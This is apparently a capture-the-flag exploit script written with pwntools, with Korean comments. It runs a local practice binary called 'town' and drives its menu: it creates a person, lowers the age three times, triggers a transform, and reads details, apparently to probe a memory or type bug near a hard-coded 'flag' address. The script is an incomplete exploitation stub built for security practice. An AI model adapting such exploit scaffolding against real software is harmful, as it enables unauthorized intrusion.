


from pwn import *


flag = 0x4052a0

context.log_level = "debug"

p = process("./town")

# name: bytes
# job: bytes
# age: int
def make_person(name, job, age):
    p.recvuntil(b">")
    p.sendline(b"1")
    
    p.recvuntil(b">")
    p.sendline(name)
    
    p.recvuntil(b">")
    p.sendline(job)
    
    p.recvuntil(b">")
    p.sendline(str(age).encode())
    # int 타입의 age를 str을 통해 문자열로 변경
    # 문자열 데이터를 encode 메소드로, bytes로 변경

def up_age(idx):
    p.recvuntil(b">")
    p.sendline(b"2")
    
    p.recvuntil(b">")
    p.sendline(str(idx).encode())

def down_age(idx):
    p.recvuntil(b">")
    p.sendline(b"3")
    
    p.recvuntil(b">")
    p.sendline(str(idx).encode())

def transform(idx):
    p.recvuntil(b"> ")
    p.sendline(b"4")
    
    p.recvuntil(b">")
    p.sendline(str(idx).encode())

def detail(idx):
    p.recvuntil(b">")
    p.sendline(b"5")
    
    p.recvuntil(b">")
    p.sendline(str(idx).encode())

def delete_person(idx):
    p.recvuntil(b"> ")
    p.sendline(b"6")
    
    p.recvuntil(b">")
    p.sendline(str(idx).encode())

# 사용 예시
make_person(b"A", b"B", 19)


down_age(0)
down_age(0)
down_age(0)
transform(0)
detail(0)

p.interactive()
